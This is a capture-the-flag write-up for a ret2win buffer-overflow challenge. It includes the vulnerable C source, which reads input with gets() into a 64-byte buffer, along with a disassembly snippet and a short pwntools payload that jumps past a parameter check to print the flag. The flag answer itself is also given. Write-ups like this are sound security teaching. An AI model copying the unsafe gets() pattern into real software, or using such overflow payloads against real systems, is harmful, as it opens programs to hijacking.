## Persuasion Check  

<img src="images/chall.png" width=600>

This is a pretty straightforward ret2win chall. There is a `persuade()` function that outputs the flag, but `main()` and `vuln()` never call it so it isn't executed.  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void persuade(persuation)
{
	if (persuation == 20)
	{
		puts("Fine you can get a flag for christmas");
		system("/bin/cat flag.txt");
		exit(0);
	}
}

int vuln()
{
	char buf[64];
	puts("Why should I get you a flag for christmas?");
	puts("Persuade: ");
	gets(buf);
	persuade(strlen(buf)%20);
}

int main()
{
	setvbuf(stdout, NULL, _IONBF, 0);
	vuln();
	
	puts("No, we already have flag at home");
	puts("NBY{flag_at_home}");
	puts("");
	puts("Better luck next christmas");
	return 0;
}
```

Running `checksec` shows that the binary has minimal protections. Most importantly, PIE isn't enabled, so addresses are fixed. This will be useful later.  

<img src="images/checksec.png" width=600>

Since only `64` bytes are allocated to the buffer and its a x64 ELF, we just have to send `72` bytes of junk to overflow the buffer, then send the address of `persuade()` to jump to that function.    

```c
int vuln()
{
	char buf[64];   // overflow with 72 bytes -> redirect to persuade()
```

However, looking at `persuade()` again, there is a `persuation` parameter defined, and it must be set to `20` for the flag to be outputted.  

```c
void persuade(persuation)
{
	if (persuation == 20)
	{
		puts("Fine you can get a flag for christmas");
		system("/bin/cat flag.txt");
		exit(0);
	}
}
```

Recalling that PIE isn't enabled, we can simply jump to the address right after the check to bypass it entirely.  

In the disassembly for `persuade()` we can easily locate the `cmp` and `jne` instructions used to verify `persuation`. We just have to jump to the next instruction at `0x0000000000401187` and the flag will be printed.  

```
0x0000000000401181 <+11>:    cmp    DWORD PTR [rbp-0x4],0x14
0x0000000000401185 <+15>:    jne    0x4011af <persuade+57>
0x0000000000401187 <+17>:    lea    rax,[rip+0xe7a]        # 0x402008
```

We can thus construct a simple payload that accomplishes this.  

```python
win = 0x0000000000401187

payload = b'A' * 72
payload += p64(win)

r.sendlineafter(b'Persuade:', payload)
```

Flag: `YBN{N4t_20_P3r5ua510n}`